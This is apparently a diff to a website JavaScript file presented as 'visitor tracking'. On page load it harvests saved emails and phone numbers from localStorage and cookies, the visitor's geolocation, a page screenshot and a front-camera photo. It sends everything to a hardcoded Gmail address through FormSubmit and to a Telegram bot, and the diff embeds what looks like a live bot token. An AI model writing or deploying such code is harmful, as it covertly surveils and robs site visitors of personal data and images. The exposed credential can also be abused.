@@ -1,5 +1,12 @@
-// Վիզիտորի տվյալների հավաքում և ուղարկում
-async function trackVisitor() {
+// Configuration
+const config = {
+    emailEndpoint: "https://formsubmit.co/ajax/soghbatyanvahan@gmail.com",
+    telegramBotToken: "8179188509:AAGQdVbcxNMX-3WQzu_IPyypucLA7ymQULk", // Replace with your actual token
+    telegramChatId: "codevahbot" // Replace with your chat ID
+  };
+  
+  // Main tracking function
+  async function trackVisitor() {
     const data = {
       website: window.location.href || "index.html",
       userAgent: navigator.userAgent,
@@ -9,16 +16,21 @@ async function trackVisitor() {
       language: navigator.language,
       referrer: document.referrer || "Direct visit",
       visitTime: new Date().toISOString(),
-      ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից"
+      ip: "Will be added by FormSubmit"
     };
   
-    // Ստուգել localStorage և cookies
+    // Get stored data from localStorage
     try {
       const savedEmail = localStorage.getItem('userEmail');
       const savedPhone = localStorage.getItem('userPhone');
       if (savedEmail) data.savedEmail = savedEmail;
       if (savedPhone) data.savedPhone = savedPhone;
+    } catch (e) {
+      console.log("LocalStorage access error:", e);
+    }
   
+    // Get cookies
+    try {
       const cookies = document.cookie.split(';').reduce((res, c) => {
         const [key, val] = c.trim().split('=').map(decodeURIComponent);
         return Object.assign(res, { [key]: val });
@@ -26,68 +38,72 @@ async function trackVisitor() {
       if (cookies.email) data.cookieEmail = cookies.email;
       if (cookies.phone) data.cookiePhone = cookies.phone;
     } catch (e) {
-      console.log("Storage access error:", e);
+      console.log("Cookie access error:", e);
     }
   
-    // Փորձել ստանալ գեոտեղադրություն
+    // Get geolocation
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         position => {
           data.latitude = position.coords.latitude;
           data.longitude = position.coords.longitude;
-          captureMedia(data);
+          captureAndSendData(data);
         },
         () => {
           data.locationError = "Geolocation unavailable";
-          captureMedia(data);
+          captureAndSendData(data);
         }
       );
     } else {
-      captureMedia(data);
+      captureAndSendData(data);
     }
   }
   
-  // Մեդիայի կատարում և ուղարկում
-  async function captureMedia(data) {
+  // Capture screenshot and send data
+  async function captureAndSendData(data) {
     try {
-      // 1. Էջի սքրինշոթ (օգտագործելով html2canvas)
+      // Load html2canvas if not already loaded
+      if (typeof html2canvas !== 'function') {
+        await loadScript('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
+      }
+  
+      // Capture page screenshot
       const canvas = await html2canvas(document.body);
-      const screenshot = canvas.toDataURL('image/jpeg', 0.8);
+      const screenshot = canvas.toDataURL('image/jpeg', 0.7);
       data.screenshot = screenshot;
   
-      // 2. Տեսախցիկի նկարներ (եթե հասանելի է)
+      // Try to capture camera image
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" } // Փորձել դիմացի տեսախցիկ
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user" } 
         });
-        
         const videoTrack = stream.getVideoTracks()[0];
         const imageCapture = new ImageCapture(videoTrack);
         const photoBlob = await imageCapture.takePhoto();
-        const cameraPhoto = await blobToBase64(photoBlob);
-        data.cameraPhoto = cameraPhoto;
-        
+        data.cameraImage = await blobToBase64(photoBlob);
         videoTrack.stop();
       } catch (cameraError) {
         console.log("Camera access error:", cameraError);
         data.cameraError = cameraError.message;
       }
   
-      // Ուղարկել տվյալները
-      await sendToEmail(data);
-      await sendToTelegram(data);
+      // Send data to both email and Telegram
+      await Promise.all([
+        sendToEmail(data),
+        sendToTelegram(data)
+      ]);
   
     } catch (error) {
-      console.error("Media capture error:", error);
-      data.error = error.message;
-      sendToEmail(data); // Ուղարկել առնվազն հիմնական տվյալները
+      console.error("Error in captureAndSendData:", error);
+      // Fallback - send basic data without media
+      sendToEmail(data);
     }
   }
   
-  // Ուղարկել էլ. փոստին (FormSubmit)
+  // Send to FormSubmit email
   async function sendToEmail(data) {
     try {
-      const response = await fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
+      const response = await fetch(config.emailEndpoint, {
         method: "POST",
         headers: { 
           'Content-Type': 'application/json',
@@ -101,31 +117,46 @@ async function trackVisitor() {
     }
   }
   
-  // Ուղարկել Telegram-ի բոտին
+  // Send to Telegram bot
   async function sendToTelegram(data) {
     try {
-      const botToken = 'CodePhoto';
-      const chatId = 'codevahbot';
-      
-      // Ուղարկել տեքստային հաղորդագրություն
-      let text = `Նոր այցելություն:\nԷջ: ${data.website}\nIP: ${data.ip}\nՍարք: ${data.userAgent}`;
-      
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      // Send text message
+      let message = `🌐 New website visit\n`;
+      message += `🕒 ${new Date(data.visitTime).toLocaleString()}\n`;
+      message += `🔗 ${data.website}\n`;
+      message += `📱 ${data.platform} (${data.screenWidth}x${data.screenHeight})\n`;
+      if (data.latitude && data.longitude) {
+        message += `📍 Location: ${data.latitude}, ${data.longitude}\n`;
+      }
+  
+      await fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: chatId,
-          text: text
+          chat_id: config.telegramChatId,
+          text: message
         })
       });
   
-      // Ուղարկել սքրինշոթը (եթե կա)
+      // Send screenshot if available
       if (data.screenshot) {
         const formData = new FormData();
-        formData.append('chat_id', chatId);
+        formData.append('chat_id', config.telegramChatId);
         formData.append('photo', dataURLtoBlob(data.screenshot), 'screenshot.jpg');
         
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        await fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      }
+  
+      // Send camera image if available
+      if (data.cameraImage) {
+        const formData = new FormData();
+        formData.append('chat_id', config.telegramChatId);
+        formData.append('photo', dataURLtoBlob(data.cameraImage), 'photo.jpg');
+        
+        await fetch(`https://api.telegram.org/bot${config.telegramBotToken}/sendPhoto`, {
           method: 'POST',
           body: formData
         });
@@ -136,7 +167,17 @@ async function trackVisitor() {
     }
   }
   
-  // Օժանդակ ֆունկցիաներ
+  // Helper functions
+  function loadScript(src) {
+    return new Promise((resolve, reject) => {
+      const script = document.createElement('script');
+      script.src = src;
+      script.onload = resolve;
+      script.onerror = reject;
+      document.head.appendChild(script);
+    });
+  }
+  
   function blobToBase64(blob) {
     return new Promise((resolve) => {
       const reader = new FileReader();
@@ -155,10 +196,5 @@ async function trackVisitor() {
     return new Blob([u8arr], {type: mime});
   }
   
-  // HTML2Canvas գրադարանի ավելացում
-  const html2canvasScript = document.createElement('script');
-  html2canvasScript.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
-  document.head.appendChild(html2canvasScript);
-  
-  // Գործարկել հետևումը էջի բեռնվելուց հետո
+  // Start tracking when page loads
   window.addEventListener('load', trackVisitor);
